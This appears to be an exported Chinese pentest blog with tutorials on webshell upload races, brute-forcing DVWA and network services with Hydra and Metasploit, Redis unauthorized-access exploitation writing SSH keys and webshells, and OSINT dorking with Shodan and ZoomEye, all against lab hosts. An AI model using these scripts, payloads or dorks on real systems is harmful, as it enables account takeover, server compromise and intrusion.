使用Python脚本实现多线程下一直访问shell.php，直到生成gg.php 123456789101112131415161718#coding=utf-8import requestsfrom multiprocessing import Pooldef CompeteUpload(list): url="http://192.168.242.128/upload-labs/Pass-17/index.php" geturl="http://192.168.242.128/upload-labs/upload/info.php" file=&#123;'upload_file':('info.php',"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;",'image/jpeg')&#125; data=&#123;'submit':'上传'&#125; r=requests.post(url=url,data=data,files=file) #print "test upload...." r1=requests.get(url=geturl) if r1.status_code==200: print "upload success!"if __name__=="__main__": pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join()]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[身份认证技术]]></title>
    <url>%2Fnote%2F2020%2Fundefined03%2Fe9e5edd8.html</url>
    <content type="text"><![CDATA[认证技术身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。 计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。 对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问。 Web认证爆破DWVA 靶场搭建官方网站:http://www.dvwa.co.uk/ 项目地址:https://github.com/ethicalhack3r/DVWA DVWA 是一个入门的 Web 安全学习靶场。这里直接去 Dokcer Hub 搜索一个容器来部署安装： 12345# 拉取镜像docker pull sqreen/dvwa# 部署安装docker run -d -t -p 8888:80 sqreen/dvwa 然后本地浏览器访问 http://127.0.0.1:8888，我们首先需要初始化一下 DVWA，相关的版本信息如下: 1234567891011121314151617181920212223# MySQL root 用户密码为空$ mysql -e &quot;select version(),user()&quot;+---------------------------+----------------+| version() | user() |+---------------------------+----------------+| 10.3.22-MariaDB-0+deb10u1 | root@localhost |+---------------------------+----------------+# PHP 7.3.14 版本$ php -vPHP 7.3.14-1~deb10u1 (cli) (built: Feb 16 2020 15:07:23) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.3.14, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.3.14-1~deb10u1, Copyright (c) 1999-2018, by Zend Technologies# Apache 版本为 2.4.38$ apache2 -vServer version: Apache/2.4.38 (Debian)Server built: 2019-10-15T19:53:42# 内核版本$ uname -aLinux 57bb72d1c052 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 GNU/Linux 在 Web 安全领域暴力破解是一个基础技能，不仅需要好的字典，还需要具有灵活编写脚本的能力。 DVWA 基础爆破 Low GET 登录不够安全，一般使用 POST 方式进行登录 用户名和密码都没有进行过滤 Medium 这个 Medium 级别的源码登录逻辑并没有啥变化，只是登录失败的时候会延时 2 秒，这样爆破的速度会慢一些，不过依然可以进行传统的暴力破解。 CTFHub Basic 基础认证爆破官网：https://www.ctfhub.com/ 「CTFHub技能树」—「Web前置技能」—「HTTP协议」—「基础认证」： 四位纯数字爆破简单编写一个代码用来练习数字爆破： 123456789&lt;?phperror_reporting(0);if(isset($_REQUEST['pass']))&#123; echo 'flag&#123;xxxxxxx&#125;';&#125;else&#123; echo 'pass is error &lt;br&gt;'; echo "hint: isset(\$_REQUEST['pass'])";&#125;?&gt; 四种常见的 POST 提交数据方式顺便提一下 四种常见的 POST 提交数据方式： application/x-www-form-urlencoded最常见的 POST 提交数据的方式了。浏览器的原生&lt;form&gt;表单，请求类似于下面这样： 1234POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=utf-8title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3 multipart/form-data另一个常见的 POST 数据提交的方式,这种方式一般用来上传文件，各大服务端语言对它也有着良好的支持。一个请求示例： 12345678910111213POST http://www.example.com HTTP/1.1Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;text&quot;title------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;Content-Type: image/pngPNG ... content of chrome.png ...------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。 然后 Content-Type 里指明了数据是以 multipart/form-data 来编码，本次请求的 boundary 是什么内容。 消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 –boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。 如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。 表单演示： 1234567891011&lt;html&gt;&lt;head&gt; &lt;title&gt;multipart/form-data 测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="http://127.0.0.1/php/brute.php" method="post" enctype="multipart/form-data"&gt; &lt;input type="text" name="pass"&gt; &lt;input type="submit"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; application/json在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串。 由于 JSON 规范的流行，除了低版本 IE 之外的各大浏览器都原生支持，服务端语言也都有处理 JSON 的函数，使用 JSON 不会遇上什么麻烦: 1234POST http://www.example.com HTTP/1.1Content-Type: application/json;charset=utf-8&#123;&quot;title&quot;:&quot;test&quot;,&quot;sub&quot;:[1,2,3]&#125; text/xml一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。典型的 XML-RPC 请求是这样的： 123456789101112POST http://www.example.com HTTP/1.1Content-Type: text/xml&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt; &lt;methodName&gt;examples.getStateName&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt; 早期安全狗也曾出现过 WAF 缺陷，因为匹配过于严谨，一个空格导致安全狗被绕过： 1234# 原内容：Content-Type: multipart/form-data; boundary=---------------------------471463142114# 修改后 boundary后面加入空格。Content-Type: multipart/form-data; boundary =---------------------------471463142114 带验证码爆破实验环境：http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php 工具：Pkav HTTP Fuzzer Python 生成一个 3 位数的字典： 12345with open('dic.txt', 'w') as f: for x in range(10): for y in range(10): for z in range(10): f.write(f'&#123;x&#125;&#123;y&#125;&#123;z&#125;\n') 使用 Pkav 的 HTTP Fuzz 测试工具进行爆破即可。 DVWA - High 带 Token 爆破源码： 1234567891011121314151617181920212223// 检测用户的 tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );// 过滤用户名和密码$user = $checkToken_GET[ 'username' ];$user = stripslashes( $user );$user = mysql_real_escape_string( $user );$pass = $_GET[ 'password' ];$pass = stripslashes( $pass );$pass = mysql_real_escape_string( $pass );$pass = md5( $pass );// 数据匹配$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";$result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; 登录成功&#125;else &#123; sleep( rand( 0, 3 ) ); 登录失败&#125; 这一关增加了 token 的检测，从如下代码: 1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置: 1require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php'; 追踪 dvwaPage.inc.php 找到 token 相关函数的定义： 123456789101112131415161718192021function checkToken( $user_token, $session_token, $returnURL ) &#123; # 校验 token if( $user_token !== $session_token || !isset( $session_token ) ) &#123; dvwaMessagePush( 'CSRF token is incorrect' ); dvwaRedirect( $returnURL ); &#125;&#125;function generateSessionToken() &#123; # 当前时间的 md5 值作为 token if( isset( $_SESSION[ 'session_token' ] ) ) &#123; destroySessionToken(); &#125; $_SESSION[ 'session_token' ] = md5( uniqid() );&#125;function destroySessionToken() &#123; # 销毁 token unset( $_SESSION[ 'session_token' ] );&#125;function tokenField() &#123; # 将 token 输出到 input 框中 return "&lt;input type='hidden' name='user_token' value='&#123;$_SESSION[ 'session_token' ]&#125;' /&gt;";&#125; 然后登陆的数据包如下: 1GET /vulnerabilities/brute/index.php?username=admin&amp;password=password&amp;Login=Login&amp;user_token=&#123;token&#125; HTTP/1.1 需要在 user_token 的后面跟上之前从源码中获取到的 token 值，这是一个登陆的完整流程，下面使用 Python 脚本进行爆破。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport reimport sysimport requestsdef get_token(headers): index_url = 'http://127.0.0.1:8888/vulnerabilities/brute/index.php' index_html = requests.get(url=index_url, headers=headers, timeout=3).text token_pattern = re.compile(r"name='user_token' value='(.*?)'") token = token_pattern.findall(index_html)[0] return tokendef brute_with_token(uname, passwd, headers): token = get_token(headers) brute_url = f'http://127.0.0.1:8888/vulnerabilities/brute/index.php?username=&#123;uname&#125;&amp;password=&#123;passwd&#125;&amp;Login=Login&amp;user_token=&#123;token&#125;' r = requests.get(url=brute_url, headers=headers) print(f'&#123;token&#125;:&#123;uname&#125;:&#123;passwd&#125;', end='\n') if 'hackable' in r.text: print('\nBingo 爆破成功') print(f'username:&#123;uname&#125; \npassword:&#123;passwd&#125;\n') os._exit(0)if __name__ == '__main__': headers = &#123; 'Host': '127.0.0.1:8888', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Cookie': 'csrftoken=zeS7KCvlVoiNMuxtdrjF77dC88sqib2J2nYf4alfeDwKeaSaEMDA5wFIH9yf8kyz; PHPSESSID=bqfflff6be4tgg69lfnv4g4ik4; security=high' &#125; username = sys.argv[1] password_path = sys.argv[2] try: with open(password_path, "r") as f: lines = ''.join(f.readlines()).split("\n") for password in lines: brute_with_token(username, password, headers) except Exception as e: print('文件读取异常') 脚本使用方法和效果： 123456789$ python brute.py admin pass.txt7e43d35b6c656afdf926a95a55d6252e:admin:Pass999...f6f9db1ba43dfd57288fb73159503652:admin:passwordBingo 爆破成功username:adminpassword:password 系统认证爆破国内常见弱口令： 爆破工具 Hydra 九头蛇https://github.com/vanhauser-thc/thc-hydra 1234567891011121314# FTP爆破hydra -L /root/user.txt -P /root/password.txt ftp://192.168.0.1 -vV# SSH 爆破hydra -L /root/user.txt -P /root/password.txt ssh://192.168.0.1 --vV# SMB 爆破hydra -l admin -P password.txt smb://10.211.55.9# MSSQL 爆破hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mssql -vV# MySQL 爆破hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mysql -vV SNETCrackerhttps://github.com/shack2/SNETCracker 超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查。 SSH登录发生异常！Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies. 找不到指定的模块。 这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP 错误一般是线程过多，一般建议最好在 10 个以内，自己慢慢试，线程多了就会出问题。 Metasploithttps://github.com/rapid7/metasploit-framework RAPID7 团队出品。Offensive Security 团队 12345show optionsset rhosts 10.20.xx.xxxset username adminset pass_file /Users/sec/Documents/Sec/hydra/password.txtrun 常见爆破思路爆破 21 FTPFTP（File Transfer Protocol，文件传输协议） 是TCP/IP 协议组中的协议之一。 hydra 指令： hydra -L user.txt -P password.txt ftp://127.0.0.1 msf 模块： 1use auxiliary/scanner/ftp/ftp_login 爆破 22 SSHSSH 为 Secure Shell 的缩写，是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。默认端口为 22 爆破前检测是否开启数据库外连，不要做无意义的爆破。 SSH 爆破 判断对方是否开启公私钥 hydra 指令hydra -L user.txt -P password.txt ssh://127.0.0.1 msf 模块： 1auxiliary/scanner/ssh/ssh_login 爆破 23 TelnetTelnet 协议是 Internet 远程登录服务的标准协议和主要方式。 msf 模块： 1msfuse auxiliary/scanner/telnet/telnet_login 超级弱口令工具和 Hydra 爆破 Telnet 不太行，尽量使用 MSF 爆破 Telnet 爆破 爆破 445 SMBSMB(Server Message Block) Windows协议族，用于文件和打印共享服务。 SMB 和 RDP 用户都是一样的能爆破SMB就不爆破RDP另外 SMB 爆破还与防火墙是否关闭有关系，总的来说 SMB 爆破首选 MSF hydra 指令： hydra -L user.txt -P password.txt smb://127.0.0.1 msf 模块： 1use auxiliary/scanner/smb/smb_login 爆破 SambaSamba 是种用来让 UNIX 系列的操作系统与微软 Windows 操作系统的 SMB 网络协议做链接的自由软件。 爆破 1433 MSSQLMSSQL 是指微软的 SQLServer 数据库，默认端口为 1433 ，默认最高权限用户为 sa ，拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。 msf 模块： 1use auxiliary/scanner/mssql/mssql_login 爆破 1521 OracleOracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。默认端口为 1521 端口，和其他数据库不同的是，爆破前得先爆破对应的 SID，不过 SID 很多都是默认的，可以使用 MSF 来进行爆破。 Metasploit 爆破 SIDmsf 模块： 1use auxiliary/scanner/oracle/sid_brut Metasploit 爆破 Oraclemsf 模块： 1use auxiliary/scanner/oracle/oracle_login 爆破 3306 MySQLMySQL 是一个关系型数据库管理系统，默认端口为 3306 爆破前检测是否开启数据库外连，不要做无意义的爆破。 hydra 指令： hydra -L user.txt -P password.txt mysql://127.0.0.1 msf 模块： 1use auxiliary/scanner/mysql/mysql_login 爆破 3389 RDP远程桌面协议 RDP （Remote Display Protocol ）是 Windows 的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到 Windows 计算机，默认端口为 3389 暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为 administrator。此外如果对方服务器开启了 SMB 445 端口的话尽量优先爆破 SMB，因为 RDP 协议比较脆弱，经不起高速的爆破。 爆破 5432 PostgreSQLPostgreSQL 是一种对象-关系型数据库管理系统，默认端口为 5432 可以直接使用超级弱口令工具爆破也可以使用 Metasploit 来进行爆破。 msf 模块： 1use auxiliary/scanner/postgres/postgres_login 爆破 6379 RedisRedis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。默认端口为 6379 可以直接使用超级弱口令工具爆破也可以使用 Metasploit。 msf 模块： 1use auxiliary/scanner/redis/redis_login 爆破 8080 TomcatTomcat 是由 Apache 软件基金会属下Jakarta项目开发的 Servlet 容器，默认端口为 8080 可以使用 Burp 的 Basic 认证爆破也可以直接使用 MSF 的模块来进行爆破。Tomcat口令是用户名在/conf/tomcat-users.xml自定义配置的，容易出现弱口令，Tomcat口令泄露的话 很容易被getshell 所以需要加固口令。 msf 模块： 1use auxiliary/scanner/http/tomcat_mgr_login 爆破 27017 MongoDBMongoDB 是一个基于分布式文件存储的数据库，当配置成无验证时，存在未授权访问。默认端口为 27017 可以直接使用超级弱口令工具爆破也可以使用 Metasploit。 1use auxiliary/scanner/mongodb/mongodb_login 未授权访问未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。 Redis 未授权访问Redis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 Redis 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行操作。 Windows 安装下载地址：https://github.com/microsoftarchive/redis/releases 打开一个 cmd 窗口 使用命令切换到 Redis 运行： 1redis-server.exe redis.windows.conf 后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的 一些基本的交互命令123456789101112# 切换到 Redis 目录下运行：redis-cli.exe -h 127.0.0.1 -p 6379# 查看Redis的相关信息127.0.0.1:6379&gt;info# SET 设置键值对测试127.0.0.1:6379&gt; SET X &quot;Tomorrow is a another day&quot;OK127.0.0.1:6379&gt; GET X&quot;Tomorrow is a another day&quot; Linux 编译安装下载地址：https://redis.io/download 1234567891011# 下载Rediswget http://download.redis.io/releases/redis-5.0.5.tar.gz# 解压tar zxvf redis-5.0.5..tar.gz# 到src目录下cd redis-5.0.5/src# 编译make 编译成功如下： make 完后 Redis 的 src 目录下会出现编译后的 Redis 服务程序 Redis-server ，还有用于测试的客户端程序 Redis-cli： 下面启动 Redis 服务: 12cd src./redis-server 注意这种方式启动 Redis 使用的是默认配置。也可以通过启动参数告诉 Redis 使用指定配置文件使用下面命令启动。redis.conf 是一个默认的配置文件。我们可以根据需要使用自己的配置文件。 启动 Redis 服务进程后，就可以使用测试客户端程序 redis-cli 和 Redis 服务交互了: 1234567root@kali-linux:~/redis-5.0.5/src# ./redis-cli -h 127.0.0.1 -p 6379127.0.0.1:6379&gt; SET y &quot;Linux Redis is Running&quot;OK127.0.0.1:6379&gt; GET y&quot;Linux Redis is Running&quot; Linux apt 安装在 Ubuntu 系统安装 Redis 可以使用以下命令： 1234567891011# 更新源$ sudo apt-get update# 安装redis$ sudo apt-get install redis-server# 启动redis$ redis-server# 测试连接$ redis-cli 未授权访问修改公私钥Redis 未授权访问在4.x/5.0.5以前版本下，我们可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。 安装配置SSH首先受害者Redis的服务器配置好公司钥登录的情况下可以直接通过修改秘钥来直接登录到服务器： 1234567891011121314# 更新源apt update# 安装openssh-serverapt install openssh-server# 允许root远程登陆echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config# SSH开机自启systemctl enable sshd# 开启SSHsystemctl start sshd 配置公私钥ssh 公私钥 \n\n\n 换三行不然公私钥会乱码 1234567891011121314# 生成公私钥ssh-keygen# 到ssh公私钥放的文件夹cd /root/.ssh/# 将公钥的内容拷贝到authorized_keys文件中cat id_rsa.pub &gt;&gt; authorized_keys# 关闭密码登陆echo "PasswordAuthentication no" &gt;&gt; /etc/ssh/sshd_config# 重启ssh/etc/init.d/ssh restart 将id-rsa拷贝到自己的机器上，用于连接SSH使用。 客户端尝试公私钥登录: 12345# 将拷贝下来的私钥设置600权限chmod 600 ~/Downloads/id_rsa# 使用私钥登陆ssh -i ~/Downloads/id_rsa root@10.211.55.4 模拟真实攻击 攻击者 IP地址 macOS 本机 10.211.55.2 Kali Linux 虚拟机 10.211.55.4 Kali Linux虚拟机配置下Redis配置文件关闭 IP地址绑定： 123$ pwd/root/redis-5.0.5$ vim redis.conf 去掉ip绑定，允许除本地外的主机远程登录redis服务，需要注释掉如下内容： 1bind 127.0.0.1 关掉保护模式： 1protected-mode no 然后重启下Redis服务： 1./src/redis-server redis.conf 首先攻击者先本地生成一对公私钥： 1234567891011121314151617181920212223242526272829303132333435363738# 连接redis$ redis-cli -h 10.211.55.4 -p 6379# 查看当前路径10.211.55.4:6379&gt; config get dir1) "dir"2) "/root/redis-5.0.5"# 查看当前要操作的文件10.211.55.4:6379&gt; config get dbfilename1) "dbfilename"2) "dump.rdb"# 设置要操作的路径10.211.55.4:6379&gt; config set dir /root/.ssh/OK# 设置要操作的文件10.211.55.4:6379&gt; config set dbfilename authorized_keysOK# 查看设置好的路径10.211.55.4:6379&gt; config get dir1) "dir"2) "/root/.ssh"# 查案设置好的文件10.211.55.4:6379&gt; config get dbfilename1) "dbfilename"2) "authorized_keys"# 写入公钥的值10.211.55.4:6379&gt; set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDq1+O0Ht8S9iAdLE1btr0A14yR5dqS3mO9cWm5gasdYh+ZT31yZ+FoFo4IRZt+T7oliRgKO4krhmARpFmAj5B0C6Tv6N6js4lvdGBlV1AhPCnp2f+3mLZ+t97vUhF7pXXxdnu8759PJZ5IwjfVsRiCgnFY3p3eDY4kCl5nVqQm71MyaOX7FZwzsNvS3ZjP3tiy0drnVnr2QSrtKWSpuzxXApPupVS7HkcyuE9zbbckuo3cOMhFk8N9R0eIokALcXlvTXjqUwwQvU79F4D4YhFeDDovZp43mggSq4Oxsy/soL79XrIv2Hpv0cUUAEp1RDKyF3V1MH1O7fdyb63xd6R5 sqlsec@com\n\n\n"OK# 将公钥的值保存到要操作的文件10.211.55.4:6379&gt; saveOK SSH 登录验证： 未授权访问写入Webshell原理和写入SSH一样，首先 Kali Linux 开启 Apache： 123456# 启动 Apachesystemctl start apache2systemctl status apache2# 写入 info.php 测试echo '&lt;?php phpinfo();?&gt;' &gt; /var/www/html/info.php 然后浏览器访问：http://127.0.0.1/info.php 查看是否生效。 123456789101112131415# 操作目录10.211.55.4:6379&gt; config set dir /var/www/html/OK# 操作文件10.211.55.4:6379&gt; config set dbfilename shell.phpOK# 设置数据10.211.55.4:6379&gt; set x "&lt;?php phpinfo();?&gt;"OK# 写入数据10.211.55.4:6379&gt; saveOK 未授权访问弹 shellcrontab 定时任务Linux 下使用原生的 crontab 命令实现定时任务： 12345# 查看定时任务crontab -l# 编辑定时任务crontab -e 编辑定时任务，一行一个任务，填写的内容如下： 12# 分 时 日 月 星期 要运行的命令30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1 表示每天 9:30 自动运行下面的命令： 1/usr/bin/python3 /root/code/t00ls/TuBi.py 这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示： 1crontab: installing new crontab 这表示新建定时任务成功。 crontab 实例实例1：每 1 分钟执行一次 myCommand 1* * * * * myCommand 实例2：每小时的第 3 和第 15 分钟执行 13,15 * * * * myCommand 实例3：在上午 8 点到 11 点的第 3 和第 15 分钟执行 13,15 8-11 * * * myCommand 实例4：每隔两天的上午 8 点到 11 点的第 3 和第 15 分钟执行 13,15 8-11 */2 * * myCommand 实例5：每周一上午 8 点到 11 点的第 3 和第 15 分钟执行 13,15 8-11 * * 1 myCommand 实例6：每晚的21:30重启smb 130 21 * * * /etc/init.d/smb restart 实例7：每月1、10、22日的 4 : 45 重启smb 145 4 1,10,22 * * /etc/init.d/smb restart 实例8：每周六、周日的 1 : 10 重启 smb 110 1 * * 6,0 /etc/init.d/smb restart 实例9：每天 18 : 00 至 23 : 00 之间每隔 30 分钟重启smb 10,30 18-23 * * * /etc/init.d/smb restart 实例10：每星期六的晚上 23 : 00 重启smb 10 23 * * 6 /etc/init.d/smb restart 实例11：每一小时重启smb 1* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb 10 23-7 * * * /etc/init.d/smb restart 关于 /etc/crontab 及 /var/spool/cron/crontabs/$USER 中定义的定时任务 /etc/crontab 只有 root 用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行： 1* * * * * root myCommand /var/spool/cron/$USER 所有用户都可以使用，可以使用 crontab -u username -e 命令来直接编辑这个文件： 1* * * * * myCommand Kali 的 shell 下有点问题，Ubuntu 16.10 已将先前默认的 bashshell 更换为了 dashshell。Debian 和 Ubuntu中，/bin/sh 默认已经指向 dash，这是一个不同于 bash 的 shell，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比bash要少很多，语法严格遵守POSIX标准。因为缺少了binbash的交互特性，所以kali中弹不回shell可以得到很好的解释了。 1ln -fs /bin/bash /bin/sh nc 命令教程https://www.sqlsec.com/2019/10/nc.html nc 被誉为网络安全界的瑞士军刀，一个简单而有用的工具，透过使用 TCP 或 UDP 协议的网络连接去读写数据。]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集]]></title>
    <url>%2Fnote%2F2020%2Fundefined02%2F312e3d12.html</url>
    <content type="text"><![CDATA[信息收集技术在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹识别工具、敏感文件、目录扫描工具，敏感信息探测工具，信息收集工具等等。很多前辈也都曾经说过：”渗透测试的本质就是信息收集” 信息收集介绍常规收集 备份文件泄露 接口泄露(小米主题商店接口信息泄露开发者敏感信息（身份证、手机等） 从信息泄露到未授权访问 端口扫描与目录扫描端口多扫几个 内网收集 内网服务器邮箱记录 浏览器保存密码记录 ESXI 认证Vcenter 可以尝试勾选启用windows登录认证 信息收集的方式可以分为两种：主动和被动。 主动的信息收集方式： 通过直接访问、扫描网站，这种将流量流经网站的行为。 被动的信息收集方式： 利用第三方服务和互联网信息进行收集。 被动信息收集（OSINT）Google Hack在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此，能否在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集，并且尽可能的获得更多的信息呢？ 默认搜索搜索引擎基本语法，直接在搜索框中输入搜索词时，谷歌默认进行模糊搜索，并能对长短语或语句进行自动拆分成小的词进行搜索。 通配符谷歌的通配符是星号 *，用通配符代替关键词或短语中无法确定的字词。 逻辑非排除某个搜索结果：渗透测试 -习近平 百度无广告 常用关键词 关键词 说明 site 指定域名 intext 正文中存在关键词的网页 intitle 标题中存在关键词的网页 inurl URL中存在关键词的网页 filetype 搜索指定文件类型 常见后台查找12345intitle:后台登录inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cmsintext:管理|后台|登陆|用户名|密码|系统|帐号 实际演示搜索南京政府的子域名信息1site:nanjing.gov.cn 搜索互联网上的登录入口1intitle:登录 搜索百度的相关登录入口1intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com 查找互联网敏感文件12filetype:mdb|doc|xlsx|pdf密码 filetype:xls 查找被黑政府站点12北京赛车 inurl:gov.cnintitle:北京赛车 inurl:gov.cn 物联网搜索引擎Shodanhttps://www.shodan.io 物联网搜索引擎，是互联网上最可怕的搜索引擎，搜索所有和互联网关联的服务器、摄像头、打印机、路由器等等。 基本语法 关键词 说明 net 搜索指定ip地址或者子网，c段 hostname 搜索指定的域名或者服务器 port 搜索开放指定端口的设备 org 搜索属于指定组织或者公司的设备 product 搜索运行指定产品或者软件操作系统的设备 version 指定软件的版本 isp 搜索指定isp供应商的设备 country 搜索指定国家的设备 city 搜索指定城市的设备 语句之间可以相互组合使用，可以运用自己的思维，相互组合成自己需要的搜索语句 实际操作查找位于国内的 Nginx 服务器1nginx country:cn 搜索位南京开启 3389 端口的服务器12port:3389 city:nanjingport:3389 os:&quot;windows 10&quot; 搜索海康威视摄像头1Hikvision-Webs country:cn city:nanjing 查看Cisco思科设备全球分布12isp:ciscoisp:cisco country:cn 查看华为设备全球分布1isp:huawei windows口令必须大小写后，弱口令TOP：P@ssw0rd 实用技巧Shodan 实用技巧，查找互相关联的网站： 1234567import mmh3import requestsresponse = requests.get(&apos;https://www.baidu.com/favicon.ico&apos;)favicon = response.content.encode(&apos;base64&apos;)hash = mmh3.hash(favicon)print(hash) 计算出的 hash 用如下语法来反查： 1http.favicon.hash：hash 查找出类似模板的IP地址：http://111.231.41.219/ 查看原始数据 Ctrl+F 搜索 favicon 根据hash值反差： 1http.favicon.hash:-865290023 找同模板网站：看是不是一个logo/favicon 用小米logo的hash值反查 研究院真实案例分享 目标黄色网站 - 拿不下 - 找到同模板的网站 - 爆破 - 进入系统 - 通用漏洞 getshell - 拿到源码 - 代码审计 - 发现漏洞 - 拿下目标网站 - getshell - 突破限制进内网 - 内网漫游拿下数据 Zoomeyehttps://www.zoomeye.org ZoomEye 中文名为“钟馗之眼”，它定位于网络空间搜索引擎，能对暴露在公网的主机设备及网站组件进行全方位搜索（只要有IP地址即可搜索到），发现其中的漏洞，揪 出网络中“藏着掖着的问题”。ZoomEye和Shodan的区别是ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。 主机搜索组件名称app: 组件名。 ver: 组件版本。 1app:”Apache httpd” ver:”2.2.16″ 端口port: 开放端口。 1port:3389 操作系统os: 操作系统。 1os:linux 服务service: 结果分析中的“服务名”字段。 1234# 公网路由器：service:routersetup# 公网摄像头：service:webcam 主机名hostname: 分析结果中的“主机名”字段。 1hostname:google.com 位置country: 国家或者地区代码。 city: 城市名称。 12345# 搜索美国的 Apache 服务器app:Apache country:US# 搜索英国的 Sendmail 服务器app:Sendmail country:UK IP 地址ip: 搜索一个指定的 IP 地址 12# Google 的公共 DNS 服务器ip:8.8.8.8 CIDRIP 的 CIDR 网段。 1cidr:8.8.8.8/24 Web应用搜索网站site:网站域名。 例子： 1site: baidu.com 标题title: 页面标题 1title:Nginx 关键词keywords: 定义的页面关键词。 1keywords:Nginx 描述desc: 定义的页面说明。 1desc:Nginx HTTP 头headers: HTTP 请求中的 Headers。 1headers:Server FQFAhttps://fofa.so FOFA是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。 基本语法直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索 title=”abc” 从标题中搜索abc标题中有北京的网站 1title=&quot;北京&quot; header=”abc” 从http头中搜索abcjboss服务器 